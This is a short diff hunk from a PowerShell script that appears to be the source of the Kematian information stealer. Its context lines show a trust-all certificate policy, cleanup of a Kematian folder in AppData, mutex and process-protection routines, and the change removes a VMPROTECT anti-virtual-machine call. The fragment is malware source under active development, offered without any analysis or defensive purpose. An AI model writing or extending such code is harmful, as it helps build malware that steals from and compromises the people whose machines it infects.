@@ -1170,8 +1170,7 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
     Remove-Item "$env:appdata\Kematian" -Force -Recurse
 }
 
-if (CHECK_AND_PATCH -eq $true) {
-    VMPROTECT
+if (CHECK_AND_PATCH -eq $true) {  
     KDMUTEX
     if (!($debug)) {
         [ProcessUtility]::MakeProcessKillable()
